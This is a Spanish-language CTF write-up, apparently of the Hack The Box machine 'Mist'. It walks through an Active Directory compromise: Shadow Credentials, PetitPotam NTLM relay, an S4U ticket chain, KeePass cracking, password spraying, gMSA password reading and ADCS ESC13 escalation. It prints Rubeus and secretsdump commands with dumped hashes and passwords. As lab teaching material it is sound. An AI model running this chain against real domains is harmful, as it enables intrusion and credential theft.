Tras añadir las Shadow Credentials para la cuenta de máquina MS01$, se habilitó la posibilidad de ejecutar
una cadena S4U (Service-for-User) con el fin de impersonar al usuario Administrator en el propio host
MS01.  Esta  técnica  es  viable  porque  las  cuentas  de  máquina  poseen,  por  diseño,  la  capacidad  de
impersonar  cualquier  identidad  local  en  el  sistema  al  que  pertenecen.  Sin  embargo,  para  ejecutar  la
cadena S4U es necesario disponer previamente del hash NTLM de la cuenta MS01$, lo que nos obliga a
repetir,  esta  vez  para  la  máquina,  el  mismo  proceso  de  abuso  de  AD  CS  que  empleamos  con
brandon.keywarp.

Es importante subrayar que, aunque obtengamos el hash NTLM de MS01$, no es posible iniciar sesiones
interactivas con dicha cuenta, ya que los machine accounts están explícitamente restringidos para este tipo
de  autenticación.  Precisamente  por  ello,  la  vía  adecuada  para  obtener  privilegios  administrativos  sobre
MS01  consiste  en  ejecutar  un  ataque  S4U2Self  +  S4U2Proxy,  aprovechando  las  Shadow  Credentials
previamente inyectadas.

El  primer  paso  operativo  consistió  en  habilitar  el  servicio  WebClient,  indispensable  para  generar
solicitudes WebDAV desde MS01. Para ello se utilizó el código EtwStartWebClient.cs, que fue compilado,
transferido  al  host  comprometido  y  ejecutado  para  activar el  servicio.  Con WebClient  operativo,  MS01
puede iniciar conexiones WebDAV, lo que resulta esencial para la coerción de autenticación NTLM sobre
HTTP.

A continuación, fue necesario introducir un registro DNS que resolviera un nombre arbitrario hacia nuestra
máquina atacante. Este requisito se fundamenta en la propia documentación de Microsoft: cuando una URL
contiene  puntos,  Windows  asume  que  se  trata  de  un  recurso  externo  (FQDN)  y,  por  tanto,  no  envía
automáticamente  credenciales  NTLM,  salvo  que  exista  una  configuración  explícita  de  proxy  bypass.
Dado que una dirección IP también contiene puntos, sería igualmente clasificada como recurso externo, lo
que impediría la autenticación automática incluso si la solicitud fuese válida.

Por este motivo, el nombre que se añada al DNS debe ser un único término sin puntos, como example,
para que Windows lo interprete como un recurso interno y envíe credenciales NTLM sin intervención del
usuario. Utilizando dnstool.py, se intentó añadir dicho registro DNS empleando las credenciales del usuario
brandon.keywarp, aprovechando sus permisos en el dominio.

Este paso es crítico: una vez que el nombre DNS interno apunta hacia nuestra máquina, cualquier intento
de  acceso  WebDAV  desde  MS01  hacia  http://example/  generará  automáticamente  una  autenticación
NTLM desde la cuenta MS01$, que podrá ser retransmitida al controlador de dominio mediante LDAP,
permitiendo así completar la cadena de abuso de AD CS y obtener el hash NTLM de la máquina.

<img src="assets/33.png">

El intento inicial de añadir un registro DNS utilizando las credenciales de brandon.keywarp resultó fallido.
Aunque  en  muchos  dominios  los  usuarios  autenticados  disponen  de  permisos  para  crear  entradas  DNS
dinámicas, en este entorno dicha capacidad no está habilitada, lo que nos obliga a replantear la estrategia.
Dado  que  no  podemos  inducir  autenticación  NTLM  hacia  un  recurso  externo  controlado  por  nosotros,
debemos aprovechar un activo interno bajo nuestro control: MS01.

La idea consiste en utilizar un puerto arbitrario del propio MS01 —por ejemplo, el 9999— y redirigir todo
el tráfico entrante en dicho puerto hacia el puerto 80 de nuestra máquina atacante. De este modo, al ejecutar
PetitPotam contra MS01@9999/whatever, la autenticación NTLM generada por MS01 será reenviada a
nuestro listener, permitiendo su posterior retransmisión hacia el controlador de dominio.

<img src="assets/34.png">

Para  implementar  esta  redirección,  se  configuró  una  regla  de  port  forwarding  a  través  del  túnel
previamente  establecido  con  Chisel,  asegurando  que  el  tráfico WebDAV  originado  en  MS01  alcanzara
nuestro host de forma transparente.

Antes de relanzar el ataque de relay, se optó por utilizar un fork de Impacket que incorpora funcionalidades
extendidas  para  la manipulación  de  Shadow  Credentials  directamente  desde  la  shell  interactiva  LDAP
proporcionada  por  ntlmrelayx.  Esta  variante  facilita  enormemente  el  proceso  de  inyección  de  claves
públicas  en  el  atributo  msDS-KeyCredentialLink,  evitando  la  necesidad  de  herramientas  adicionales  o
modificaciones manuales.

<img src="assets/35.png">

Tras  clonar  el  repositorio  y  preparar  un  entorno  virtual  de  Python,  se  ejecutó  ntlmrelayx.py  desde  el
directorio examples/, utilizando ProxyChains para enrutar el tráfico a través del túnel. La herramienta se
configuró para apuntar al servicio LDAPS del controlador de dominio y se habilitó la opción -i con el fin
de obtener una shell LDAP interactiva tras un relay exitoso.

Con el listener preparado, se lanzó nuevamente PetitPotam, esta vez apuntando a MS01@9999. El ataque
tuvo éxito: ntlmrelayx  registró la recepción de  una  autenticación  NTLM válida procedente de la cuenta
MS01$, la retransmitió correctamente hacia LDAPS y abrió una shell interactiva en el puerto 11000 de
nuestra máquina local.

Al conectarnos mediante nc 127.0.0.1 11000 y ejecutar help, se confirmó la disponibilidad de los comandos
clear_shadow_creds y set_shadow_creds, incorporados en este fork específico.

<img src="assets/36.png">

Con estas herramientas, procedimos a preparar el entorno para la inyección de Shadow Credentials en la
cuenta  de  máquina  MS01$,  comenzando  por  eliminar  cualquier  clave  preexistente  mediante
clear_shadow_creds.

<img src="assets/37.png">

Tras establecer el túnel y disponer de un canal estable hacia el entorno interno, se procedió a obtener el
hash NTLM de la cuenta de máquina MS01$ utilizando Certipy, aprovechando la infraestructura AD
CS  del  dominio.  Una  vez  generado  el  certificado  asociado  a  las  Shadow  Credentials,  se  eliminó  la
protección por contraseña del archivo PFX con el fin de permitir su uso directo en operaciones PKINIT.

En  lugar  de  recurrir  a  un  flujo  basado  en  claves  RC4  derivadas  del  hash  NTLM,  se  optó  por  una
aproximación más robusta: solicitar un TGT para MS01$ empleando directamente el certificado PFX,
lo  que  permite  autenticarse  mediante  PKINIT  utilizando  la clave  privada que  controlamos  gracias  a  las
Shadow Credentials.

<img src="assets/38.png">

Una vez obtenido un TGT válido para la cuenta de máquina MS01$ mediante PKINIT con el certificado
PFX generado a partir de las Shadow Credentials, se procedió a utilizar Rubeus para completar la cadena
de  abuso  Kerberos  necesaria  para  obtener  privilegios  administrativos  sobre  MS01.  El  objetivo  no  era
solicitar directamente un Service Ticket, sino ejecutar la secuencia S4U2Self → S4U2Proxy, aprovechando
la capacidad inherente de las cuentas de máquina para impersonar identidades locales.

Este  comando  permitió  a  MS01$  solicitar,  en  primer  lugar,  un  ticket  S4U2Self  en  nombre  del  usuario
Administrator, y posteriormente encadenarlo mediante S4U2Proxy para obtener un Service Ticket válido
para el servicio CIFS/ms01.mist.htb. Este ticket, una vez extraído y convertido, habilitó la ejecución de
un remote secretsdump contra MS01, permitiendo recuperar el hash NTLM del usuario Administrator y,
finalmente, establecer una sesión interactiva mediante WinRM.

```text
PS C:\xampp\htdocs\herramientas> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cisf/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP67ldWfLOvOTzKlHRiOSK9QI7pk0k/IDFEvyeT0t8vMBqKQZLTHoiufY+qfmcTpAVSE8L5K9coLrRDjy21SXrmDYx2w4RWUrYf4OwrWvTwfRuP750JOrrAkIu4XT8XCVZt27ZYo/5mac8fcB5hx8Pt847MwIrJ3VJ8kN6TI14YhD3h6qGEYAqhcYs8+vO71pzdjmIHNeo8o3ws0Cfo3aDKrga7AVIpEW0WqTd9HKiwqYLGD3pQCwtfGDhxNJPXbdNZwh7tzyirK1qJ5Z9x8LyhOfLiEgVTvHgHZzk1lO/Nm7PSLKmqDG7G8h2OQOBu4MpobppSW/VXWbrejT22mkeM7yeZsIrNCSgVb3e+3q8FGpl/sul7qTmUMluZmpHBfx2YuPkzNx8cnRCBdJEoBdsGwT0q+6ODci5xq9REHqsUKX6UUAtqYLs1Ld6NzYq/SeRGsHSnXZQvCnZJhAJC0k69VAVYZ07Ojhq9VjjgbHVJuw5atcni1N7JU6eUZ6BrGhxBEdPhblURQwQVgYRKd5/Ha4wy9U9NCp2WM6j5FzW8IS4qJOcTg2wSQmc/2OeODGOqbekFo8Fc/ansLj2wUo98cfrtNvaOkUwmfyZHCr6RSKqiGZyzL834IEr41G0QbrnBjANdKQGxU91Y+PAHcV/5BpXnLI5CiSn8MNyRNNAVx+Y0YWExP9lKRQRO98w28t12gUmS0eZml7cE3g5kr7os21uT/wXWk3mkMuuklSsw77hndy+r6BB0uwbSrFo1t6+V1VfD/NNE4VE+By+Uv/OQazz9bWtes7prVDH5QpqoOc4Wi4080x+NzNpAGwLBKKRv+lkgksvBR+BYMkJSj7k+IJrW2AbtKe76/AKmGVecBEHlvJFYCiqVr686uj1S/lCI6QmUyLSJJyy1zCEqGpx20gpT26C9cGApdyxFdQpL0HqaawXEvLjnCAHrZEMxNt0f6etHaORgxHTg1CYYQ7YiPhXlaeWwuAck5KdqHbpZwf4DTrUeiyMOmqhaD/CXuLThtwNeWvw5hPcWw6QxXPCfkwezEBygZAS2eXqCogvasb5/0ipAdx+wUDcMHml1jCF0haCqnqJnoH9CG+nco32vXwL+iCgpoHY0wIMvFEUl/e6wZpNHlg8vcpboRBoDwULuoYolvHQlI1IW+g8E7wxq0/wDQ3ZpPh61fSR8PahypNsqN/aXvTqMAb6RZ7m0XwCKUHBLmKHmYvacZ9hxmZorJtVPvCAB9llS7UxSE1w63UgZ539geCHkHhcr2MssMBLRqVghJd2EfnhKgciztPedVJdwTZqhrbBhLR3yGxqdl1dTBaoPljlwc0++EXAskONviJdU5n3NRK08QqOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEP5PUZ/9ohnBeNYEN+XgbJahChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI2MDMyNTIxMDE0NVqmERgPMjAyNjAzMjYwNzAxNDVapxEYDzIwMjYwNDAxMjEwMTQ1WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'ms01$@MIST.HTB'
[*] Using domain controller: DC01.mist.htb (192.168.100.100)
[*] Sending S4U2self request to 192.168.100.100:88
[+] S4U2self success!
[*] Substituting alternative service name 'cisf/ms01.mist.htb'
[*] Got a TGS for 'Administrator' to 'cisf@MIST.HTB'
[*] base64(ticket.kirbi):

      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

```

El resultado fue un ticket Kerberos en formato kirbi, codificado en Base64. Tras extraerlo, se procedió a
decodificarlo  y  almacenarlo  localmente.  Posteriormente,  se  utilizó  la  herramienta  ticketConverter  de
Impacket  para  transformar  el  archivo  kirbi  en  un  ccache,  formato  compatible  con  las  herramientas  de
autenticación de Impacket.

Con  el  ccache  preparado,  se  ejecutó  un  remote  secretsdump  contra  MS01,  aprovechando  el  ticket  de
servicio  obtenido  mediante  la  cadena  S4U.  Este  procedimiento  permitió  recuperar  el  hash  NTLM  del
usuario Administrator, consolidando así el acceso privilegiado al host.

```text
┌──(usuario㉿kali)-[~/HTB/mist/content]
└─$ KRB5CCNAME=administrator.ticket.ccache proxychains4 -q impacket-secretsdump -k -no-pass administrator@ms01.mist.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::
[*] Dumping cached domain logon information (domain/username:hash)
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2026-03-25 21:10:58+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MIST\MS01$:plain_password_hex:cb16820566f9fb41f552b2f7b0abd3ae351b11acc9228978ab522b658aada2ad070c67f142d225de3158729e700628a2280b7cf1e302a9ecface390f78c643a12c88cd169bbd32a21da0cb5ecf3973abf97b672a272f3b4211a6a8b16d588c81c55dadfed9220e5fa9cbbddded550a8158482f9a4d9f045504774c2b5cfbd2f3e3a30c007d77627b47508b21c1b155bd172d1aab46f88c2010d6f746d06e0f298969979ade5a70a0168242eab12d476c4aff9858909b72af4500aad6abb0689d21c3efdcc1e1fc1782096e905c3298cfb64827dd45cd13012c18904323a0b5718ba9b1e4e312bf07e43d2ba705b0bf9c
MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:94af5b968f6bbe944b70a167188a8017:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
[*] NL$KM
 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.
 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.
 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.
 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb
NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
[*] _SC_ApacheHTTPServer
svc_web:MostSavagePasswordEver123
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

Finalmente, utilizando dicho hash, se estableció una sesión interactiva sobre WinRM mediante evil-winrm,
obteniendo  control  administrativo  completo  sobre  MS01  y  cerrando  de  forma  exitosa  la  cadena  de
explotación.

<img src="assets/41.png">

<p align="center"><strong><u>Gaining Access as op_Sharon.Mullard on DC01</u></strong></p>

Durante  la  enumeración  del  sistema  comprometido  con  privilegios  de  Administrator,  se  identificaron
varios elementos de interés en el directorio de usuario de sharon.mullard. Entre ellos destacaba un archivo
KeePass (.kdbx) denominado sharon.kdbx, junto con dos imágenes almacenadas en la carpeta Pictures.
Dado que una base de datos KeePass suele contener credenciales de alto valor, se procedió a descargar los
tres archivos para su análisis local.

<img src="assets/42.png">

El archivo image_20022024.png resultó especialmente relevante: mostraba lo que parecía ser un intento de
la usuaria de manipular o transformar una contraseña utilizando CyberChef, concretamente aplicando una
conversión a Base64.

<img src="assets/43.png">

Como  primer  intento,  se  utilizó  esta  cadena  directamente  para  desbloquear  la  base  de  datos  KeePass
mediante keepassxc, pero la operación falló. Un examen más detallado de la imagen reveló que parte de la
contraseña parecía estar oculta tras la ventana del bloc de notas, lo que sugería que la cadena visible era
incompleta.

Para recuperar los caracteres faltantes, se optó por realizar un ataque de tipo mask attack con hashcat,
utilizando como base la porción conocida de la contraseña. Antes de ello, fue necesario extraer el hash de
la base de datos KeePass mediante keepass2john, generando un formato compatible con hashcat.

<img src="assets/44.png">

Una  vez  obtenido  el  hash,  se  ejecutó  hashcat  con  una  máscara  adaptada  a  la  estructura  parcial  de  la
contraseña, permitiendo recuperar la cadena completa tras un proceso de cracking exitoso.

Con la contraseña íntegra ya identificada, se procedió finalmente a desbloquear la base de datos KeePass,
habilitando el acceso a las credenciales almacenadas en su interior.

<img src="assets/45.png">

Durante la revisión de la base de datos KeePass, se identificó una única entrada que contenía la contraseña
ImTiredOfThisJob:(.

Sin  embargo,  la  entrada  no  especificaba  un  nombre  de  usuario  asociado,  lo  que  impedía  determinar
directamente a qué identidad del dominio pertenecía. Para resolver esta incertidumbre, se decidió realizar
un  password  spraying  controlado  contra  todos  los  usuarios  del  dominio,  con  el  fin  de  identificar  si  la
contraseña correspondía a alguna cuenta válida.

Como  primer  paso,  se  generó  un  listado  completo  de  usuarios  del  dominio  utilizando  el  módulo
GetADUsers de Impacket, obteniendo así un inventario exhaustivo de identidades potenciales.

<img src="assets/46.png">

Con  el  listado  de  usuarios  disponible,  se  procedió  a  ejecutar  un  ataque  de  password  spraying  mediante
netexec, proporcionando la contraseña recuperada de la base de datos KeePass. El objetivo era identificar
cualquier coincidencia válida sin provocar bloqueos de cuenta ni generar ruido innecesario en el entorno.
El resultado reveló que la contraseña correspondía a la cuenta op_Sharon.Mullard.

<img src="assets/47.png">

Es  importante  destacar  que  esta  identidad  es  distinta  de  la  cuenta  Sharon.Mullard,  lo  que  sugiere  la
existencia de un usuario operativo o de servicio asociado a la misma persona, pero con un rol diferenciado
dentro del dominio.

Con estas credenciales válidas, se procedió a establecer una sesión remota contra DC01 mediante WinRM,
consolidando así acceso directo al controlador de dominio bajo una identidad legítima del entorno.

<img src="assets/48.png">

<p align="center"><strong><u>Gaining control over the svc_ca$ account</u></strong></p>

Tras  obtener  acceso  interactivo  al  controlador  de  dominio  mediante  la  cuenta  op_Sharon.Mullard,
resultaba  imprescindible  volver  a  consultar  BloodHound  para  identificar  posibles  configuraciones
delegadas o permisos sensibles asociados a este nuevo usuario. El análisis reveló un hallazgo especialmente
relevante:  como  miembro  del  grupo  OPERATIVES,  la  cuenta  op_sharon.mullard  posee  el  privilegio
ReadGMSAPassword sobre el objeto SVC_CA$, un Group Managed Service Account (gMSA) utilizado
en el entorno.

<img src="assets/49.png">

Los  gMSA  emplean  contraseñas  complejas  generadas  y  rotadas  automáticamente  por Active  Directory,
diseñadas para ser utilizadas exclusivamente por servicios o equipos autorizados. Estas contraseñas no se
almacenan  en  texto  claro  en  los  sistemas  y  solo  pueden  ser  recuperadas  por  identidades  que  posean
explícitamente el derecho ReadGMSAPassword. Este permiso permite consultar, a través de LDAP, la
contraseña  actual  del  gMSA,  lo  que  en  la  práctica  equivale  a  obtener  su  hash  NTLM  y,  por  tanto,
autenticarse como dicho servicio.

Dado que op_sharon.mullard dispone de este privilegio sobre SVC_CA$, se procedió a utilizar netexec
para recuperar directamente el hash NTLM del gMSA.

La operación fue exitosa, proporcionando el NTLM hash de SVC_CA$, un activo de alto valor estratégico
dentro  del  dominio.  Este  tipo  de  cuentas  suele  estar  asociado  a  servicios  críticos  —en  este  caso,
presumiblemente relacionados con la infraestructura de certificación (CA)—, lo que abre la puerta a nuevas
rutas de escalada y control dentro del entorno.

<img src="assets/50.png">

<p align="center"><strong><u>Gaining control over svc_cabackup account</u></strong></p>

Tras obtener acceso a la cuenta SVC_CA$, resultaba imprescindible volver a consultar BloodHound para
identificar posibles  rutas adicionales de escalada  asociadas a este nuevo  principal.  El análisis reveló un
hallazgo  especialmente  significativo:  SVC_CA$  posee  el  privilegio  AddKeyCredentialLink  sobre  la
cuenta SVC_CABACKUP.

<img src="assets/51.png">

Este permiso es crítico porque permite modificar el atributo msDS-KeyCredentialLink del objeto objetivo,
lo que habilita la inyección de Shadow Credentials. En la práctica, esto significa que podemos replicar
exactamente la misma técnica utilizada previamente contra MS01$: añadir una clave pública controlada
por nosotros al objeto SVC_CABACKUP, y posteriormente utilizar la clave privada correspondiente para
autenticarnos mediante PKINIT como dicho principal.

Una  vez  añadidas  las  Shadow  Credentials,  la  cuenta  SVC_CABACKUP  pasa  a  ser  completamente
controlable desde el punto de vista criptográfico. Esto permite ejecutar la misma cadena TGT → U2U que
se  utilizó  anteriormente  para  el  usuario  brandon.keywarp,  obteniendo  finalmente  el  hash  NTLM  de  la
cuenta de servicio.

Para llevar a cabo esta operación, se empleó Certipy a través de ProxyChains, aprovechando su capacidad
para gestionar Shadow Credentials y realizar autenticación PKINIT de forma transparente sobre el túnel
establecido. Certipy automatiza tanto la inyección de claves como la solicitud de TGTs y la ejecución del
flujo  U2U,  lo  que  simplifica  considerablemente  el  proceso  respecto  a  la  combinación  manual  de
herramientas utilizada en fases anteriores.

<img src="assets/52.png">

<p align="center"><strong><u>Obtaining Domain Admin Privileges</u></strong></p>

Tras  comprometer  la  cuenta  SVC_CABACKUP,  se  revisaron  nuevamente  sus  pertenencias  a  grupos
mediante  BloodHound,  con  el  objetivo  de  identificar  rutas  adicionales  de  escalada  dentro  de  la
infraestructura de Active Directory.

<img src="assets/53.png">

El  análisis  reveló  que  SVC_CABACKUP  es  miembro  del  grupo  CERTIFICATE  SERVICES,  un
conjunto de identidades con privilegios avanzados sobre la infraestructura de certificación del dominio. A
partir de esta información, se ejecutaron varias de las consultas Cypher predefinidas en BloodHound, en
particular la que evalúa plantillas vulnerables a ADCS ESC13 mediante la relación Enrollment Rights on
CertTemplates  with  OIDGroupLink.  Esta  consulta  permite  identificar  plantillas  de  certificación  que,
combinadas con permisos delegados, pueden ser abusadas para obtener privilegios elevados.

El resultado fue especialmente relevante: los miembros del grupo CERTIFICATE SERVICES pueden
obtener  membresía  efectiva  en  el  grupo  CERTIFICATE  MANAGERS  abusando  de  la  plantilla
MANAGERAUTHENTICATION,  la  cual  es  vulnerable  a  ESC13.  Esta  relación  es  crítica,  ya  que
CERTIFICATE MANAGERS forma parte del grupo CA_BACKUP, ampliando aún más la superficie de
ataque.

<img src="assets/54.png">

A  su  vez,  los  miembros  del  grupo  CA_BACKUP  pueden  obtener  membresía  en  el  grupo
SERVICEACCOUNTS  mediante  la  plantilla  BACKUPSVCAUTHENTICATION,  que  también
presenta  vulnerabilidades  asociadas  a  ESC13.  Esta  cadena  de  relaciones  permite  escalar  privilegios  de
forma progresiva a través de la infraestructura de certificación, aprovechando plantillas mal configuradas
y permisos delegados entre grupos.

<img src="assets/55.png">

Finalmente,  el  grupo  SERVICEACCOUNTS  es  miembro  del  grupo  BACKUP  OPERATORS,  un
conjunto de identidades con privilegios altamente sensibles dentro del dominio, incluyendo la capacidad de
leer  archivos  protegidos,  manipular  servicios  críticos  y,  en  algunos  casos,  realizar  operaciones  que
conducen directamente a la toma de control del controlador de dominio.

<img src="assets/56.png">

Tras identificar que la cadena de privilegios derivada de SVC_CABACKUP finalizaba en el grupo Backup
Operators, se evaluó el impacto real de alcanzar dicho nivel de acceso. Los miembros de este grupo poseen
permisos  de  lectura  sobre  todos  los  archivos  del  sistema,  incluidos  los  hives  SAM,  SYSTEM  y
SECURITY, lo que permite extraer las credenciales locales almacenadas en el controlador de dominio.
Este vector constituye una vía directa para comprometer completamente el host y, por extensión, el dominio.

A partir de la información recopilada mediante BloodHound, se diseñó una cadena de explotación basada
en  el  abuso  de  ADCS  ESC13,  aprovechando  plantillas  de  certificación  mal  configuradas  y  relaciones
delegadas  entre  grupos.  El  primer  paso  consistió  en  solicitar  un  certificado  para  la  cuenta
SVC_CABACKUP utilizando la plantilla ManagerAuthentication, vulnerable a ESC13.

<img src="assets/57.png">

La emisión de este certificado otorgó membresía efectiva en el grupo Certificate Managers, habilitando
el acceso a plantillas adicionales que no estaban disponibles inicialmente.

<img src="assets/58.png">

Con este certificado, se obtuvo un TGT mediante PKINIT y se utilizó para solicitar un segundo certificado
basado en la plantilla BackupSvcAuthentication, igualmente vulnerable a ESC13 y accesible únicamente
gracias a la membresía adquirida en el paso anterior.

<img src="assets/59.png">

La  emisión  de  este  segundo  certificado  elevó  los  privilegios  efectivos  de  la  cuenta  hasta  el  grupo
ServiceAccounts, que a su vez deriva en Backup Operators, consolidando así el acceso necesario para
interactuar con los hives del sistema.

<img src="assets/60.png">

Una  vez  obtenido  el  nuevo  TGT  asociado  a  estos  privilegios,  se  procedió  a  extraer  los  hives  SAM,
SYSTEM y SECURITY utilizando el módulo reg de Impacket.

<img src="assets/61.png">

Posteriormente, los archivos fueron descargados a través de evil-winrm y procesados localmente mediante
secretsdump, lo que permitió recuperar los hashes locales del  sistema, incluido  el correspondiente a la
cuenta de máquina DC01$.

```text
┌──(usuario㉿kali)-[~/HTB/mist/content]
└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59
dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8
[*] NL$KM
